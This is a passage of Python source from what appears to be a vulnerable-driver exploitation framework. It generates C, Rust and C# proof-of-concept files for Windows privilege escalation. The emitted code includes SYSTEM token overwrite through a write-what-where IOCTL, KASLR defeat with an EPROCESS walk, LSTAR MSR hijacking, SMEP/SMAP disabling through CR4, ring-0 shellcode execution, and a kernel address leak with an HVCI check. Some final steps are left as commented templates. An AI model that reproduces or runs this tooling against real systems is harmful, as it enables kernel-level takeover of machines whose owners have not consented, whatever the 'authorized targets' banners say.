    if has_www:
        www_code = next(code for _, code, _, tags, _, _ in entries if 'write_what_where' in tags)
        a('/* === WRITE-WHAT-WHERE: Token Overwrite === */')
        a('#define IOCTL_WWW  0x{:08X}'.format(www_code))
        a('')
        a('typedef struct { uint64_t target_addr; uint64_t value; } WWW_PAYLOAD;')
        a('')
        a('static int www_write(uint64_t where, uint64_t what) {')
        a('    WWW_PAYLOAD p = { where, what };')
        a('    return send_ioctl(IOCTL_WWW, &p, sizeof(p), NULL, 0);')
        a('}')
        a('')
        a('static int exploit_token_overwrite(void) {')
        a('    printf("[>] Token overwrite via write-what-where\\n");')
        a('    if (!OWN_EPROCESS || !SYSTEM_EPROCESS) {')
        a('        printf("[!] Run EPROCESS finder first and fill in defines\\n");')
        a('        return 0;')
        a('    }')
        a('    /* Read SYSTEM token (need arb_read or use EPROCESS finder value) */')
        a('    uint64_t own_token_addr = OWN_EPROCESS + OFF_EPROCESS_TOKEN;')
        a('    /* Overwrite own Token with SYSTEM token */')
        a('    /* Token values have RefCnt in low 4 bits, clear them */')
        a('    /* uint64_t system_token = <read from SYSTEM EPROCESS + OFF_EPROCESS_TOKEN>; */')
        a('    /* www_write(own_token_addr, system_token & ~0xFULL); */')
        a('    printf("[+] Token overwrite template ready - fill SYSTEM token value\\n");')
        a('    return 1;')
        a('}')
        a('')

    if has_read:
        read_code = next(code for _, code, _, tags, _, _ in entries if 'arb_read' in tags)
        a('/* === ARBITRARY READ: KASLR Defeat + EPROCESS Walk === */')
        a('#define IOCTL_READ  0x{:08X}'.format(read_code))
        a('')
        a('static int arb_read(uint64_t addr, void *out, uint32_t len) {')
        a('    return send_ioctl(IOCTL_READ, &addr, sizeof(addr), out, len);')
        a('}')
        a('')
        a('static uint64_t read_qword(uint64_t addr) {')
        a('    uint64_t val = 0;')
        a('    arb_read(addr, &val, sizeof(val));')
        a('    return val;')
        a('}')
        a('')
        a('static int exploit_kaslr_defeat(void) {')
        a('    printf("[>] KASLR defeat via arbitrary read\\n");')
        a('    /* Read PsInitialSystemProcess pointer */')
        a('    uint64_t psis_ptr = NTOSKRNL_BASE + 0x0; /* offset from EPROCESS finder */')
        a('    uint64_t system_eprocess = read_qword(psis_ptr);')
        a('    printf("[+] SYSTEM EPROCESS: 0x%llx\\n", (unsigned long long)system_eprocess);')
        a('')
        a('    /* Walk ActiveProcessLinks to find our process */')
        a('    uint64_t current = system_eprocess;')
        a('    uint32_t target_pid = GetCurrentProcessId();')
        a('    for (int i = 0; i < 256; i++) {')
        a('        uint64_t link = read_qword(current + OFF_ACTIVE_LINKS);')
        a('        uint64_t next_ep = link - OFF_ACTIVE_LINKS;')
        a('        uint32_t pid = 0;')
        a('        arb_read(next_ep + OFF_PID, &pid, 4);')
        a('        if (pid == target_pid) {')
        a('            printf("[+] Found our EPROCESS: 0x%llx (PID %u)\\n",')
        a('                   (unsigned long long)next_ep, pid);')
        a('            return 1;')
        a('        }')
        a('        current = next_ep;')
        a('        if (current == system_eprocess) break;')
        a('    }')
        a('    printf("[-] PID %u not found in process list\\n", target_pid);')
        a('    return 0;')
        a('}')
        a('')

    if has_msr:
        msr_codes = [code for _, code, _, tags, _, _ in entries if 'msr_rw' in tags]
        msr_rd = msr_codes[0]
        msr_wr = msr_codes[1] if len(msr_codes) > 1 else msr_rd
        a('/* === MSR R/W: LSTAR Hijack Template === */')
        a('#define IOCTL_MSR_RD  0x{:08X}'.format(msr_rd))
        a('#define IOCTL_MSR_WR  0x{:08X}'.format(msr_wr))
        a('#define IA32_LSTAR 0xC0000082')
        a('')
        a('#pragma pack(push,1)')
        a('typedef struct { uint32_t msr_index; uint64_t value; } MSR_WR_PAYLOAD;')
        a('#pragma pack(pop)')
        a('')
        a('static uint64_t read_msr(uint32_t index) {')
        a('    uint64_t out = 0;')
        a('    send_ioctl(IOCTL_MSR_RD, &index, sizeof(index), &out, sizeof(out));')
        a('    return out;')
        a('}')
        a('')
        a('static int write_msr(uint32_t index, uint64_t value) {')
        a('    MSR_WR_PAYLOAD p = { index, value };')
        a('    return send_ioctl(IOCTL_MSR_WR, &p, sizeof(p), NULL, 0);')
        a('}')
        a('')
        a('static int exploit_lstar_hijack(void) {')
        a('    printf("[>] LSTAR hijack via MSR write\\n");')
        a('    printf("[!] WARNING: Requires HVCI disabled. Will BSOD with HVCI.\\n");')
        a('    uint64_t original_lstar = read_msr(IA32_LSTAR);')
        a('    printf("[+] Original LSTAR: 0x%llx\\n", (unsigned long long)original_lstar);')
        a('    /* Allocate user-mode shellcode page */')
        a('    /* write_msr(IA32_LSTAR, (uint64_t)shellcode_page); */')
        a('    /* Trigger syscall */')
        a('    /* Restore: write_msr(IA32_LSTAR, original_lstar); */')
        a('    printf("[+] LSTAR hijack template ready\\n");')
        a('    return 1;')
        a('}')
        a('')

    if has_ring0:
        r0_code = next(code for _, code, _, tags, _, _ in entries if 'ring0_exec' in tags)
        a('/* === RING-0 EXEC: Direct Token Steal === */')
        a('#define IOCTL_EXEC  0x{:08X}'.format(r0_code))
        a('')
        a('/* Token steal shellcode - must be PIC, runs at ring-0 */')
        a('/* See shellcode payloads file for pre-built versions */')
        a('static int exploit_ring0_exec(void) {')
        a('    printf("[>] Ring-0 code execution via function pointer\\n");')
        a('    printf("[!] WARNING: Requires SMEP disabled or SMEP bypass.\\n");')
        a('    /* Allocate RWX page, copy token steal shellcode */')
        a('    /* LPVOID sc_page = VirtualAlloc(NULL, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE); */')
        a('    /* memcpy(sc_page, token_steal_shellcode, sizeof(token_steal_shellcode)); */')
        a('    /* send_ioctl(IOCTL_EXEC, &sc_page, sizeof(sc_page), NULL, 0); */')
        a('    printf("[+] Ring-0 exec template ready\\n");')
        a('    return 1;')
        a('}')
        a('')

    if has_cr:
        cr_code = next(code for _, code, _, tags, _, _ in entries if 'cr_access' in tags)
        a('/* === CR ACCESS: SMEP/SMAP Disable === */')
        a('#define IOCTL_CR  0x{:08X}'.format(cr_code))
        a('')
        a('static int exploit_smep_disable(void) {')
        a('    printf("[>] SMEP/SMAP disable via CR4 write\\n");')
        a('    printf("[!] WARNING: Blocked by HVCI (hypervisor traps CR4 writes)\\n");')
        a('    /* Read CR4, clear bit 20 (SMEP) and bit 21 (SMAP) */')
        a('    /* uint64_t cr4 = read_cr4_via_ioctl(); */')
        a('    /* cr4 &= ~((1ULL << 20) | (1ULL << 21)); */')
        a('    /* write_cr4_via_ioctl(cr4); */')
        a('    printf("[+] CR4 template ready\\n");')
        a('    return 1;')
        a('}')
        a('')

    if has_port:
        port_code = next(code for _, code, _, tags, _, _ in entries if 'port_io' in tags)
        a('/* === PORT IO: PCI Config via CF8/CFC === */')
        a('#define IOCTL_PORT  0x{:08X}'.format(port_code))
        a('')
        a('typedef struct { uint16_t port; uint8_t size; uint8_t pad; uint32_t value; } PORT_PAYLOAD;')
        a('')
        a('static uint32_t port_read(uint16_t port, uint8_t size) {')
        a('    PORT_PAYLOAD p = { port, size, 0, 0 };')
        a('    uint32_t out = 0;')
        a('    send_ioctl(IOCTL_PORT, &p, sizeof(p), &out, sizeof(out));')
        a('    return out;')
        a('}')
        a('')
        a('static int port_write(uint16_t port, uint8_t size, uint32_t value) {')
        a('    PORT_PAYLOAD p = { port, size, 0, value };')
        a('    return send_ioctl(IOCTL_PORT, &p, sizeof(p), NULL, 0);')
        a('}')
        a('')
        a('static uint32_t pci_config_read(uint8_t bus, uint8_t dev, uint8_t func, uint8_t reg) {')
        a('    uint32_t addr = (1 << 31) | (bus << 16) | (dev << 11) | (func << 8) | (reg & 0xFC);')
        a('    port_write(0xCF8, 4, addr);')
        a('    return port_read(0xCFC, 4);')
        a('}')
        a('')

    if has_inc:
        inc_code = next(code for _, code, _, tags, _, _ in entries if 'arb_increment' in tags)
        a('/* === ARBITRARY INCREMENT: Token Privilege Flip === */')
        a('#define IOCTL_INC  0x{:08X}'.format(inc_code))
        a('')
        a('static int arb_increment(uint64_t addr) {')
        a('    return send_ioctl(IOCTL_INC, &addr, sizeof(addr), NULL, 0);')
        a('}')
        a('')
        a('static int exploit_priv_flip(void) {')
        a('    printf("[>] Privilege flip via arbitrary increment\\n");')
        a('    if (!OWN_EPROCESS) {')
        a('        printf("[!] Run EPROCESS finder first\\n");')
        a('        return 0;')
        a('    }')
        a('    /* Read own Token value, clear RefCnt bits */')
        a('    /* uint64_t token = read_qword(OWN_EPROCESS + OFF_EPROCESS_TOKEN) & ~0xFULL; */')
        a('    /* Increment each byte of _SEP_TOKEN_PRIVILEGES.Enabled to set all bits */')
        a('    /* for (int i = 0; i < 8; i++) { */')
        a('    /*     for (int j = 0; j < 255; j++) arb_increment(token + OFF_TOKEN_PRIV + 8 + i); */')
        a('    /* } */')
        a('    printf("[+] Privilege flip template ready\\n");')
        a('    return 1;')
        a('}')
        a('')

    a('/* === Main: Select and run exploit === */')
    a('int main(int argc, char **argv) {')
    a('    printf("[*] Exploit templates for ' + driver_name + '\\n");')
    a('    g_dev = CreateFileA(DEVICE_PATH, 0xC0000000, 3, NULL, 3, 0, NULL);')
    a('    if (g_dev == INVALID_HANDLE_VALUE) {')
    a('        printf("[!] Device open failed: %lu\\n", GetLastError());')
    a('        return 1;')
    a('    }')
    a('    printf("[+] Device opened\\n");')

    templates = []
    if has_www: templates.append(('token_overwrite', 'exploit_token_overwrite'))
    if has_read: templates.append(('kaslr_defeat', 'exploit_kaslr_defeat'))
    if has_msr: templates.append(('lstar_hijack', 'exploit_lstar_hijack'))
    if has_ring0: templates.append(('ring0_exec', 'exploit_ring0_exec'))
    if has_cr: templates.append(('smep_disable', 'exploit_smep_disable'))
    if has_inc: templates.append(('priv_flip', 'exploit_priv_flip'))

    if templates:
        a('    if (argc < 2) {')
        a('        printf("Usage: exploit <technique>\\n");')
        for name, _ in templates:
            a('        printf("  {}\\n");'.format(name))
        a('        return 0;')
        a('    }')
        for name, func in templates:
            a('    if (_stricmp(argv[1], "{}") == 0) return !{}();'.format(name, func))
    else:
        a('    printf("[!] No exploit templates generated (no primitives detected)\\n");')

    a('    CloseHandle(g_dev);')
    a('    return 0;')
    a('}')

    return '\n'.join(L) + '\n'


# ---------------------------------------------------------------------------
# 13c: Multi-Language Output (Rust + C#)
# ---------------------------------------------------------------------------

def _emit_rust(driver_name, device_path, entries):
    """Emit Rust POC using windows-sys crate."""
    L = []
    def a(s): L.append(s)

    a('//! Auto-generated Rust POC for: ' + driver_name)
    a('//! Build: cargo build --release')
    a('//! Cargo.toml deps: windows-sys = { version = "0.52", features = [')
    a('//!   "Win32_Foundation", "Win32_Storage_FileSystem", "Win32_System_IO"] }')
    a('//! USE ON AUTHORIZED TARGETS ONLY.')
    a('')
    a('use std::mem;')
    a('use std::ptr;')
    a('')
    a('#[cfg(windows)]')
    a('mod exploit {')
    a('    use windows_sys::Win32::Foundation::*;')
    a('    use windows_sys::Win32::Storage::FileSystem::*;')
    a('    use windows_sys::Win32::System::IO::*;')
    a('    use std::ffi::CString;')
    a('')
    a('    const DEVICE_PATH: &str = "' + device_path.replace('\\\\', '\\') + '";')
    a('')

    # IOCTL constants
    for idx, code, method, tags, in_sz, out_sz in entries:
        label = ', '.join(tags) if tags else 'none'
        a('    pub const IOCTL_{}: u32 = 0x{:08X}; // [{}]'.format(idx, code, label))
    a('')

    a('    pub struct Driver {')
    a('        handle: HANDLE,')
    a('    }')
    a('')
    a('    impl Driver {')
    a('        pub fn open() -> Result<Self, u32> {')
    a('            let path = CString::new(DEVICE_PATH).unwrap();')
    a('            let h = unsafe {')
    a('                CreateFileA(')
    a('                    path.as_ptr() as *const u8,')
    a('                    0xC0000000, // GENERIC_READ | GENERIC_WRITE')
    a('                    3,          // FILE_SHARE_READ | FILE_SHARE_WRITE')
    a('                    std::ptr::null(),')
    a('                    3,          // OPEN_EXISTING')
    a('                    0, 0,')
    a('                )')
    a('            };')
    a('            if h == INVALID_HANDLE_VALUE {')
    a('                return Err(unsafe { GetLastError() });')
    a('            }')
    a('            Ok(Driver { handle: h })')
    a('        }')
    a('')
    a('        pub fn ioctl(&self, code: u32, input: &[u8], out_size: usize) -> Result<Vec<u8>, u32> {')
    a('            let mut output = vec![0u8; out_size];')
    a('            let mut bytes_returned: u32 = 0;')
    a('            let ok = unsafe {')
    a('                DeviceIoControl(')
    a('                    self.handle, code,')
    a('                    input.as_ptr() as *const std::ffi::c_void,')
    a('                    input.len() as u32,')
    a('                    output.as_mut_ptr() as *mut std::ffi::c_void,')
    a('                    out_size as u32,')
    a('                    &mut bytes_returned, std::ptr::null_mut(),')
    a('                )')
    a('            };')
    a('            if ok == 0 {')
    a('                return Err(unsafe { GetLastError() });')
    a('            }')
    a('            output.truncate(bytes_returned as usize);')
    a('            Ok(output)')
    a('        }')
    a('    }')
    a('')
    a('    impl Drop for Driver {')
    a('        fn drop(&mut self) {')
    a('            unsafe { CloseHandle(self.handle); }')
    a('        }')
    a('    }')
    a('}')
    a('')
    a('#[cfg(windows)]')
    a('fn main() {')
    a('    println!("[*] {} Rust POC", "' + driver_name + '");')
    a('    let drv = match exploit::Driver::open() {')
    a('        Ok(d) => { println!("[+] Device opened"); d }')
    a('        Err(e) => { eprintln!("[!] Open failed: {}", e); return; }')
    a('    };')
    a('')
    a('    // Probe all IOCTLs')
    for idx, code, method, tags, in_sz, out_sz in entries:
        a('    match drv.ioctl(exploit::IOCTL_{}, &[0u8; 0x{:X}], 0x{:X}) {{'.format(idx, in_sz, out_sz))
        a('        Ok(data) => println!("[+] IOCTL 0x{:08X}: {{}} bytes", data.len()),'.format(code))
        a('        Err(e) => println!("[-] IOCTL 0x{:08X}: err {{}}", e),'.format(code))
        a('    }')
    a('}')
    a('')
    a('#[cfg(not(windows))]')
    a('fn main() { eprintln!("Windows only"); }')

    return '\n'.join(L) + '\n'


def _emit_csharp(driver_name, device_path, entries):
    """Emit C# P/Invoke POC for execute-assembly."""
    L = []
    def a(s): L.append(s)

    a('// Auto-generated C# P/Invoke POC for: ' + driver_name)
    a('// Usage: execute-assembly or dotnet run')
    a('// USE ON AUTHORIZED TARGETS ONLY.')
    a('')
    a('using System;')
    a('using System.Runtime.InteropServices;')
    a('')
    a('namespace DriverPOC {')
    a('    class Program {')
    a('        const string DEVICE_PATH = @"' + device_path.replace('\\\\', '\\') + '";')
    a('')
    a('        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]')
    a('        static extern IntPtr CreateFileA(string path, uint access, uint share,')
    a('            IntPtr sec, uint disp, uint flags, IntPtr templ);')
    a('')
    a('        [DllImport("kernel32.dll", SetLastError = true)]')
    a('        static extern bool DeviceIoControl(IntPtr hDev, uint code,')
    a('            byte[] inBuf, uint inLen, byte[] outBuf, uint outLen,')
    a('            out uint bytesRet, IntPtr overlapped);')
    a('')
    a('        [DllImport("kernel32.dll")]')
    a('        static extern bool CloseHandle(IntPtr h);')
    a('')
    a('        static IntPtr INVALID = new IntPtr(-1);')
    a('')

    # IOCTL constants
    for idx, code, method, tags, in_sz, out_sz in entries:
        a('        const uint IOCTL_{} = 0x{:08X};'.format(idx, code))
    a('')

    a('        static IntPtr OpenDevice() {')
    a('            IntPtr h = CreateFileA(DEVICE_PATH, 0xC0000000, 3, IntPtr.Zero, 3, 0, IntPtr.Zero);')
    a('            if (h == INVALID) throw new Exception($"Open failed: {Marshal.GetLastWin32Error()}");')
    a('            return h;')
    a('        }')
    a('')
    a('        static bool Ioctl(IntPtr h, uint code, byte[] input, byte[] output, out uint br) {')
    a('            return DeviceIoControl(h, code, input, (uint)input.Length,')
    a('                output, (uint)output.Length, out br, IntPtr.Zero);')
    a('        }')
    a('')
    a('        static void Main(string[] args) {')
    a('            Console.WriteLine("[*] {} C# POC");'.format(driver_name))
    a('            IntPtr dev;')
    a('            try { dev = OpenDevice(); }')
    a('            catch (Exception ex) { Console.WriteLine($"[!] {ex.Message}"); return; }')
    a('            Console.WriteLine("[+] Device opened");')
    a('')
    a('            // Probe all IOCTLs')

    for idx, code, method, tags, in_sz, out_sz in entries:
        a('            {')
        a('                byte[] inBuf = new byte[0x{:X}];'.format(in_sz))
        a('                byte[] outBuf = new byte[0x{:X}];'.format(out_sz))
        a('                uint br;')
        a('                bool ok = Ioctl(dev, IOCTL_{}, inBuf, outBuf, out br);'.format(idx))
        a('                Console.WriteLine($"  IOCTL 0x{:08X}: {{(ok ? "OK" : "ERR")}} br={{br}}");'.format(code))
        a('            }')

    a('')
    a('            CloseHandle(dev);')
    a('            Console.WriteLine("[+] Done");')
    a('        }')
    a('    }')
    a('}')

    return '\n'.join(L) + '\n'


# ---------------------------------------------------------------------------
# 13d: Crash-Safe Probe Mode
# ---------------------------------------------------------------------------

def _emit_probe_safe(driver_name, device_path, entries):
    """Emit crash-safe probe that isolates each IOCTL in a child process."""
    L = []
    def a(s): L.append(s)

    a('/*')
    a(' * Crash-safe IOCTL probe for: ' + driver_name)
    a(' * Each IOCTL is tested in a child process. If the child dies (BSOD/hang),')
    a(' * the parent logs the code and continues with remaining IOCTLs.')
    a(' * Build: cl /W3 /Zi ' + driver_name + '-probe-safe.c')
    a(' * USE ON AUTHORIZED TARGETS ONLY.')
    a(' */')
    a('#include <windows.h>')
    a('#include <stdio.h>')
    a('#include <stdlib.h>')
    a('#include <string.h>')
    a('')
    a('#define DEVICE_PATH  "' + device_path + '"')
    a('#define TIMEOUT_MS   5000  // 5 second timeout per IOCTL')
    a('')
    a('static DWORD g_ioctl_codes[] = {')
    for _, code, _, _, _, _ in entries:
        a('    0x{:08X},'.format(code))
    a('};')
    a('#define NUM_IOCTLS (sizeof(g_ioctl_codes)/sizeof(g_ioctl_codes[0]))')
    a('')
    a('/* Child process mode: test a single IOCTL */')
    a('static int child_probe(DWORD code) {')
    a('    HANDLE dev = CreateFileA(DEVICE_PATH, 0xC0000000, 3, NULL, 3, 0, NULL);')
    a('    if (dev == INVALID_HANDLE_VALUE) return 2;')
    a('    BYTE in_buf[0x200] = {0};')
    a('    BYTE out_buf[0x200] = {0};')
    a('    DWORD br = 0;')
    a('    BOOL ok = DeviceIoControl(dev, code, in_buf, sizeof(in_buf),')
    a('                              out_buf, sizeof(out_buf), &br, NULL);')
    a('    CloseHandle(dev);')
    a('    return ok ? 0 : 1;')
    a('}')
    a('')
    a('/* Parent process: spawn child for each IOCTL */')
    a('static void parent_probe(void) {')
    a('    char self_path[MAX_PATH];')
    a('    GetModuleFileNameA(NULL, self_path, MAX_PATH);')
    a('')
    a('    int ok_count = 0, fail_count = 0, crash_count = 0;')
    a('    printf("[>] Crash-safe probing %d IOCTLs (timeout: %dms)...\\n",')
    a('           (int)NUM_IOCTLS, TIMEOUT_MS);')
    a('')
    a('    for (int i = 0; i < (int)NUM_IOCTLS; i++) {')
    a('        DWORD code = g_ioctl_codes[i];')
    a('        char cmd[512];')
    a('        snprintf(cmd, sizeof(cmd), "\\"%s\\" --child 0x%08X", self_path, code);')
    a('')
    a('        STARTUPINFOA si = {0}; si.cb = sizeof(si);')
    a('        PROCESS_INFORMATION pi = {0};')
    a('        if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE,')
    a('                            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {')
    a('            printf("  [%3d] 0x%08X SPAWN_FAIL\\n", i, code);')
    a('            continue;')
    a('        }')
    a('')
    a('        DWORD wait = WaitForSingleObject(pi.hProcess, TIMEOUT_MS);')
    a('        if (wait == WAIT_TIMEOUT) {')
    a('            TerminateProcess(pi.hProcess, 99);')
    a('            printf("  [%3d] 0x%08X TIMEOUT (possible hang/BSOD)\\n", i, code);')
    a('            crash_count++;')
    a('        } else {')
    a('            DWORD exit_code = 0;')
    a('            GetExitCodeProcess(pi.hProcess, &exit_code);')
    a('            if (exit_code == 0) {')
    a('                printf("  [%3d] 0x%08X OK\\n", i, code);')
    a('                ok_count++;')
    a('            } else if (exit_code == 1) {')
    a('                printf("  [%3d] 0x%08X ERR (IOCTL failed normally)\\n", i, code);')
    a('                fail_count++;')
    a('            } else {')
    a('                printf("  [%3d] 0x%08X CRASH (exit=0x%X)\\n", i, code, exit_code);')
    a('                crash_count++;')
    a('            }')
    a('        }')
    a('        CloseHandle(pi.hProcess);')
    a('        CloseHandle(pi.hThread);')
    a('    }')
    a('')
    a('    printf("\\n[+] Results: %d OK, %d ERR, %d CRASH/TIMEOUT\\n",')
    a('           ok_count, fail_count, crash_count);')
    a('}')
    a('')
    a('int main(int argc, char **argv) {')
    a('    if (argc >= 3 && strcmp(argv[1], "--child") == 0) {')
    a('        DWORD code = (DWORD)strtoul(argv[2], NULL, 16);')
    a('        return child_probe(code);')
    a('    }')
    a('    parent_probe();')
    a('    puts("\\nPress Enter to exit...");')
    a('    (void)getchar();')
    a('    return 0;')
    a('}')

    return '\n'.join(L) + '\n'


# ---------------------------------------------------------------------------
# 13e: EPROCESS Finder Modernization (extended offset table + HVCI check)
# ---------------------------------------------------------------------------

def _emit_eprocess_finder_v2(driver_name, device_path, www_code, ainc_code):
    """Modernized EPROCESS finder with HVCI detection, alternative leak methods,
    and extended offset table including Win11 24H2."""
    wwwc = ('0x%08X' % www_code) if www_code else '0'
    ainc = ('0x%08X' % ainc_code) if ainc_code else '0'

    L = []
    def a(s): L.append(s)

    a('/*')
    a(' * EPROCESS Finder v2 for: ' + driver_name)
    a(' * Improvements over v1:')
    a(' *   - HVCI detection (warns if code-exec primitives are blocked)')
    a(' *   - Alternative kernel address leak (EnumDeviceDrivers fallback)')
    a(' *   - Extended offset table (Win10 1809 - Win11 24H2)')
    a(' *   - KVAS/KVA Shadow awareness')
    a(' * Build: cl /W3 /Zi ' + driver_name + '-eprocess-finder-v2.c')
    a(' * USE ON AUTHORIZED TARGETS ONLY.')
    a(' */')
    a('#include <windows.h>')
    a('#include <winternl.h>')
    a('#include <psapi.h>')
    a('#include <stdio.h>')
    a('#include <stdint.h>')
    a('#include <stdlib.h>')
    a('#include <string.h>')
    a('')
    a('#pragma comment(lib, "advapi32.lib")')
    a('#pragma comment(lib, "psapi.lib")')
    a('')
    a('#define DEVICE_PATH  "' + device_path + '"')
    a('#define IOCTL_WWW    ' + wwwc)
    a('#define IOCTL_INC    ' + ainc)
    a('')
    a('typedef NTSTATUS (NTAPI *pfnNtQSI)(ULONG, PVOID, ULONG, PULONG);')
    a('static pfnNtQSI g_NtQSI;')
    a('')
    a('#define SystemModuleInformation          11')
    a('#define SystemExtendedHandleInformation  64')
    a('#define SystemCodeIntegrityInformation   103')
    a('#define STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)')
    a('')
    a('typedef struct { ULONG CodeIntegrityOptions; } SYSTEM_CODEINTEGRITY_INFO;')
    a('')
    a('typedef struct _RTL_MOD {')
    a('    HANDLE Section; PVOID MappedBase; PVOID ImageBase; ULONG ImageSize;')
    a('    ULONG Flags; USHORT LoadOrderIndex; USHORT InitOrderIndex;')
    a('    USHORT LoadCount; USHORT OffsetToFileName; UCHAR FullPathName[256];')
    a('} RTL_MOD;')
    a('typedef struct _RTL_MODS { ULONG Count; RTL_MOD Modules[1]; } RTL_MODS;')
    a('')
    a('typedef struct _SYS_HANDLE_EX {')
    a('    PVOID Object; ULONG_PTR UniqueProcessId; ULONG_PTR HandleValue;')
    a('    ULONG GrantedAccess; USHORT CreatorBackTraceIndex; USHORT ObjectTypeIndex;')
    a('    ULONG HandleAttributes; ULONG Reserved;')
    a('} SYS_HANDLE_EX;')
    a('typedef struct _SYS_HANDLE_INFO_EX {')
    a('    ULONG_PTR NumberOfHandles; ULONG_PTR Reserved; SYS_HANDLE_EX Handles[1];')
    a('} SYS_HANDLE_INFO_EX;')
    a('')
    a('/* Extended offset table */')
    for line in _gen_c_off_table_v2():
        a(line)
    a('')
    a('/* --- HVCI Detection --- */')
    a('static int detect_hvci(void) {')
    a('    SYSTEM_CODEINTEGRITY_INFO ci = {0};')
    a('    ULONG len = 0;')
    a('    NTSTATUS st = g_NtQSI(SystemCodeIntegrityInformation, &ci, sizeof(ci), &len);')
    a('    if (st != 0) return -1;')
    a('    int hvci = (ci.CodeIntegrityOptions & 0x1) != 0;')
    a('    printf("[*] HVCI: %s\\n", hvci ? "ENABLED (code-exec primitives blocked)" : "DISABLED");')
    a('    if (hvci) {')
    a('        printf("    [!] LSTAR hijack, CR4 modification, and ring-0 exec will BSOD\\n");')
    a('        printf("    [+] Data-only attacks still viable (token overwrite, callback removal)\\n");')
    a('    }')
    a('    return hvci;')
    a('}')
    a('')
    a('/* --- Kernel base via EnumDeviceDrivers (fallback if SystemModuleInformation restricted) --- */')
    a('static ULONG_PTR get_ntoskrnl_base_fallback(void) {')
    a('    LPVOID drivers[1024];')
    a('    DWORD needed = 0;')
    a('    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) return 0;')
    a('    /* First driver is ntoskrnl */')
    a('    return (ULONG_PTR)drivers[0];')
    a('}')
    a('')
    a('static ULONG_PTR get_ntoskrnl_base(char *disk_path_out, size_t path_sz) {')
    a('    RTL_MODS *m = malloc(0x40000);')
    a('    if (!m) return get_ntoskrnl_base_fallback();')
    a('    NTSTATUS st = g_NtQSI(SystemModuleInformation, m, 0x40000, NULL);')
    a('    if (st) { free(m); return get_ntoskrnl_base_fallback(); }')
    a('    ULONG_PTR base = (ULONG_PTR)m->Modules[0].ImageBase;')
    a('    char *name = (char *)m->Modules[0].FullPathName + m->Modules[0].OffsetToFileName;')
    a('    snprintf(disk_path_out, path_sz, "C:\\\\Windows\\\\System32\\\\%s", name);')
    a('    free(m);')
    a('    return base;')
    a('}')
    a('')
    a('static SYS_HANDLE_INFO_EX *query_all_handles(void) {')
    a('    ULONG sz = 0x40000;')
    a('    for (;;) {')
    a('        SYS_HANDLE_INFO_EX *buf = malloc(sz);')
    a('        if (!buf) return NULL;')
    a('        ULONG out = 0;')
    a('        NTSTATUS st = g_NtQSI(SystemExtendedHandleInformation, buf, sz, &out);')
    a('        if (st == 0) return buf;')
    a('        free(buf);')
    a('        if (st != STATUS_INFO_LENGTH_MISMATCH) return NULL;')
    a('        sz = out + 0x1000;')
    a('    }')
    a('}')
    a('')
    a('static ULONG_PTR handle_to_kva(SYS_HANDLE_INFO_EX *hi, ULONG_PTR pid, HANDLE h) {')
    a('    ULONG_PTR hval = (ULONG_PTR)h;')
    a('    for (ULONG_PTR i = 0; i < hi->NumberOfHandles; i++) {')
    a('        SYS_HANDLE_EX *e = &hi->Handles[i];')
    a('        if (e->UniqueProcessId == pid && e->HandleValue == hval) return (ULONG_PTR)e->Object;')
    a('    }')
    a('    return 0;')
    a('}')
    a('')
    a('static const OFFSETS *detect_offsets(void) {')
    a('    char buf[16] = {0}; DWORD sz = sizeof(buf), build = 0; HKEY hk;')
    a('    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,')
    a('            "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion", 0, KEY_READ, &hk) == 0) {')
    a('        RegQueryValueExA(hk, "CurrentBuildNumber", NULL, NULL, (LPBYTE)buf, &sz);')
    a('        RegCloseKey(hk); build = (DWORD)atoi(buf);')
    a('    }')
    a('    for (int i = 0; g_off_table[i].build != 0; i++)')
    a('        if (g_off_table[i].build == build) return &g_off_table[i];')
    a('    printf("[!] Build %lu not in table -- using fallback\\n", build);')
    a('    return &g_off_table[sizeof(g_off_table)/sizeof(g_off_table[0]) - 1];')
    a('}')
    a('')
    a('static void enable_sedebug(void) {')
    a('    HANDLE hTok; TOKEN_PRIVILEGES tp = {0};')
    a('    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok)) return;')
    a('    LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid);')
    a('    tp.PrivilegeCount = 1; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;')
    a('    AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), NULL, NULL);')
    a('    CloseHandle(hTok);')
    a('}')
    a('')
    a('int main(void) {')
    a('    g_NtQSI = (pfnNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");')
    a('    enable_sedebug();')
    a('    printf("=== EPROCESS Finder v2 -- ' + driver_name + ' ===\\n\\n");')
    a('')
    a('    detect_hvci();')
    a('    printf("\\n");')
    a('')
    a('    const OFFSETS *off = detect_offsets();')
    a('    char bld_buf[16] = {0}; DWORD bld_sz = sizeof(bld_buf), build = 0; HKEY bk;')
    a('    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,')
    a('            "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion", 0, KEY_READ, &bk) == 0) {')
    a('        RegQueryValueExA(bk, "CurrentBuildNumber", NULL, NULL, (LPBYTE)bld_buf, &bld_sz);')
    a('        RegCloseKey(bk); build = (DWORD)atoi(bld_buf);')
    a('    }')
    a('    printf("[*] Build: %lu\\n", build);')
    a('    printf("[*] Offsets: PID=+0x%X Links=+0x%X Token=+0x%X Priv=+0x%X Protection=+0x%X\\n",')
    a('           off->pid, off->links, off->token, off->priv, off->protection);')
    a('')
    a('    ULONG_PTR pid = (ULONG_PTR)GetCurrentProcessId();')
    a('    HANDLE hSelf = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pid);')
    a('    HANDLE hTok = NULL; OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok);')
    a('    HANDLE hSys = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 4);')
    a('')
    a('    SYS_HANDLE_INFO_EX *hi = query_all_handles();')
    a('    if (!hi) { puts("[!] Handle query failed"); return 1; }')
    a('')
